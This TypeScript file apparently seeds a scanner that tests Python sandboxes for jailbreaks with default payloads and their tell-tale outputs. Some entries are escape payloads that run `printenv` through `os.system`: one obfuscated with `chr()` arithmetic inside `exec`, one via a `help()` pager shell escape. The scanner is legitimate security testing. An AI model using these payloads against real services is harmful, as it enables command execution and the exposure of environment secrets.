/** @format */

import { PayloadT, PayloadsT } from "../models/PayloadsT";

export const defaultPayloads: PayloadsT = // TODO: payloads.jsonから読み込む
  (
    [
      {
        payload: ["77*77"],
        unexpected: ["5929"],
        severity: "safe",
      },
      {
        payload: ['__import__("os").system("printenv")'],
        unexpected: ["PyJailBreak_b981a35bde"],
        severity: "critical",
      },
      {
        payload: ['print("Satoki")'],
        unexpected: ["Satoki"],
        severity: "warning",
      },
      {
        payload: [
          "exec(chr(11+11+11+11+11+11+11+11+1+1+1+1+1+1+1)+chr(11+11+11+11+11+11+11+11+1+1+1+1+1+1+1)+chr(11+11+11+11+11+11+11+11+11+1+1+1+1+1+1)+chr(11+11+11+11+11+11+11+11+11+1+1+1+1+1+1+1+1+1+1)+chr(111+1)+chr(111)+chr(111+1+1+1)+chr(111+1+1+1+1+1)+chr(11+11+11+11+11+11+11+11+1+1+1+1+1+1+1)+chr(11+11+11+11+11+11+11+11+1+1+1+1+1+1+1)+chr(11+11+11+1+1+1+1+1+1+1)+chr(11+11+11+1+1+1+1+1+1)+chr(111)+chr(111+1+1+1+1)+chr(11+11+11+1+1+1+1+1+1)+chr(11+11+11+1+1+1+1+1+1+1+1)+chr(11+11+11+11+1+1)+chr(111+1+1+1+1)+chr(111+1+1+1+1+1+1+1+1+1+1)+chr(111+1+1+1+1)+chr(111+1+1+1+1+1)+chr(11+11+11+11+11+11+11+11+11+1+1)+chr(11+11+11+11+11+11+11+11+11+1+1+1+1+1+1+1+1+1+1)+chr(11+11+11+1+1+1+1+1+1+1)+chr(11+11+11+1+1+1+1+1+1)+chr(111+1)+chr(111+1+1+1)+chr(11+11+11+11+11+11+11+11+11+1+1+1+1+1+1)+chr(11+11+11+11+11+11+11+11+11+11)+chr(111+1+1+1+1+1)+chr(11+11+11+11+11+11+11+11+11+1+1)+chr(11+11+11+11+11+11+11+11+11+11)+chr(111+1+1+1+1+1+1+1)+chr(11+11+11+1+1+1+1+1+1)+chr(11+11+11+1+1+1+1+1+1+1+1))",
        ],
        unexpected: ["PyJailBreak_b981a35bde"],
        severity: "critical",
      },
      {
        payload: ["help()", "os", ":!printenv"],
        unexpected: ["PyJailBreak_b981a35bde"],
        severity: "critical",
      },
      {
        payload: ["77*77"],
        unexpected: ["[259]{4}"],
        severity: "critical",
        unexpected_option: "regex",
      },
      {
        payload: ["77*77"],
        unexpected: ["77*77"],
        unexpected_option: "eval",
        severity: "critical",
      },
      {
        payload: ["[i for i in range(100)] #import"],
        payload_option: "eval",
        unexpected: ["[0, 1, 2, 3, 4, 5, 6, 7, 8, 9,"],
        severity: "critical",
      },
    ] as PayloadT[]
  ).map((payload: PayloadT, id) => ({
    id: id,
    ...payload,
  }));
